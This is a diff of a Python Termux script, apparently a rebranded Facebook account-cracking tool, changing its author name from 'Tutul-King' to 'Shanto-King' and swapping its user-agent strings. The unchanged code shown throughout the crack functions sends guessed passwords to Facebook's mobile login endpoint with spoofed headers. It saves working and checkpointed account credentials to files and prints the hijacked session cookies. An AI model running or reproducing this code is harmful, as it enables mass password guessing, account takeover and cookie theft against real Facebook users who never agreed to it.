@@ -1,5 +1,5 @@
 ##os.system("pkg install espeak")
-#-----------------[ Tutul-King ]-------------------#
+#-----------------[ Shanto-King ]-------------------#
  
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
@@ -16,7 +16,7 @@ from rich.text import Text as tekz
 from time import localtime as lt
 pretty.install()
 CON=sol()
- #------------------[ Tutul-King ]-------------------#
+ #------------------[ Shanto-King ]-------------------#
 import os, platform, time, sys
 print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
 time.sleep(5)
@@ -24,18 +24,12 @@ os.system('clear')
 print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT GIFT GROUP")
 time.sleep(2)
 os.system(f'xdg-open https://facebook.com/groups/554714119911648/')
-#------------------[ Tutul-King ]-------------------#
+#------------------[ Shanto-King ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
-ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
-ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
-ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
-ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
-ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
-ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
-ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
-ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
-ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
-ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
+ua =  '[FBAN/Orca-Android;FBAV/396.1.0.28.104;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/429650999;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'
+ua =  '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/AIRTEL;FBMF/INFINIX MOBILE LIMITED;FBBD/INFINIX;FBPN/com.facebook.katana;FBDV/INFINIX X676C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
+ua =  '[FBAN/FB4A;FBAV/433.0.0.31.111;FBBV/445612523;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/445612523;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A720F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
+ua =  '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/AIRTEL;FBMF/INFINIX MOBILE LIMITED;FBBD/INFINIX;FBPN/com.facebook.katana;FBDV/INFINIX X676C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
  
 ugen2=[]
 ugen=[]
@@ -111,7 +105,7 @@ pwpluss,pwnya=[],[]
  
  
 
-#------------[ Tutul- ]--------------#
+#------------[ Shanto- ]--------------#
  
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -187,13 +181,13 @@ def clear():
 def back():
     login()
 def contact():
-   # os.system('xdg-open https://www.facebook.com/Tutul.King.Ok.Bro')
+   # os.system('xdg-open https://www.facebook.com/Shanto.King.Ok.Bro')
     back()
 def linex():
     print('\033[1;37m')
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-os.system("xdg-open https://www.facebook.com/Tutul.King.Ok.Bro")
+os.system("xdg-open https://www.facebook.com/Shanto.King.Ok.Bro")
 #------------------[ LOGO-LAKNAT ]-----------------#
 logo =""" 
 \033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
@@ -205,18 +199,18 @@ logo ="""
 ║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-╠══[Author                   • \33[1;38mMR-TUTUL ]\33[1;38m     ║\033[1;31m 
-╠══[Facebook                 • Tutul King ]   ║  \033[1;97m  
-╠══[Github                   • \33[1;38mTutul-King ]   ║\33[1;34m   
-╠══[Whatsapp                 • 01608843956 ]  ║\33[1;35m 
-╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
-╠══[VERSION                  • 4.7 ]          ║\033[1;35m 
+╠══[Author                   • \33[1;38mRJ-SHANTO ]\33[1;38m     ║\033[1;31m 
+╠══[Facebook                 • SH AN TO ]   ║  \033[1;97m  
+╠══[Github                   • \33[1;38mSHANTO-KING ]   ║\33[1;34m   
+╠══[Whatsapp                 • 013108682** ]  ║\33[1;35m 
+╠══[TOOLS                    • PRIVATE ]         ║ \33[1;32m   
+╠══[VERSION                  • 0.1 ]          ║\033[1;35m 
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 os.system('clear')
 print(logo)
 os.system('espeak -a 300 " Your,   Real,  Name,"')
 uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  Tutul,  King,  Tools"')
+os.system('espeak -a 300 " Welcome,   to,  Shanto,  King,  Tools"')
 pass
  
  
@@ -278,18 +272,18 @@ def menu():
     print(f"""\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mCHECK OK IDz   """)
     print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""")
     print('\033[0;97m=================')
-    TUTUL = input('\x1b[1;92m[+] CHOOSE: ')
-    if TUTUL in ['111']:
+    Shanto = input('\x1b[1;92m[+] CHOOSE: ')
+    if Shanto in ['111']:
         login()
         dump_massal()
-    elif TUTUL in ['1']:
+    elif Shanto in ['1']:
         crack_file()
-    elif TUTUL in ['2','02']:
+    elif Shanto in ['2','02']:
         os.system('xdg-open https://wa.me/+8801608843956')
         os.system("python nono.py")
-    elif TUTUL in ['3','03']:
+    elif Shanto in ['3','03']:
         result()
-    elif TUTUL in ['0']:
+    elif Shanto in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
         print('\033[0;97m=================')
@@ -523,7 +517,7 @@ def setting():
     print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
     print('\033[0;91m==================')
     hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
-    #os.system("xdg-open https://www.facebook.com/Tutul.King.Ok.Bro")
+    #os.system("xdg-open https://www.facebook.com/Shanto.King.Ok.Bro")
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
@@ -618,7 +612,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;92m{bo}[Tutul•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;92m{bo}[Shanto•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -635,7 +629,7 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;94m[Tutul-Cp] {idf} • {pw}')
+                print(f'\r\033[0;94m[Shanto-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -645,8 +639,8 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;92m[Tutul-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
-                os.system('espeak -a 300 " Tutul,  Ok,  id"')
+                print(f'\r\033[0;92m[Shanto-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+                os.system('espeak -a 300 " Shanto,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
@@ -660,7 +654,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[Tutul-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[Shanto-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -677,7 +671,7 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Tutul-Cp] {idf} • {pw}')
+                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Shanto-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -687,8 +681,8 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Tutul-Ok] {idf} • {pw} ')
-                os.system('espeak -a 300 " Ok,  Tutul,  id"')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Shanto-Ok] {idf} • {pw} ')
+                os.system('espeak -a 300 " Ok,  Shanto,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
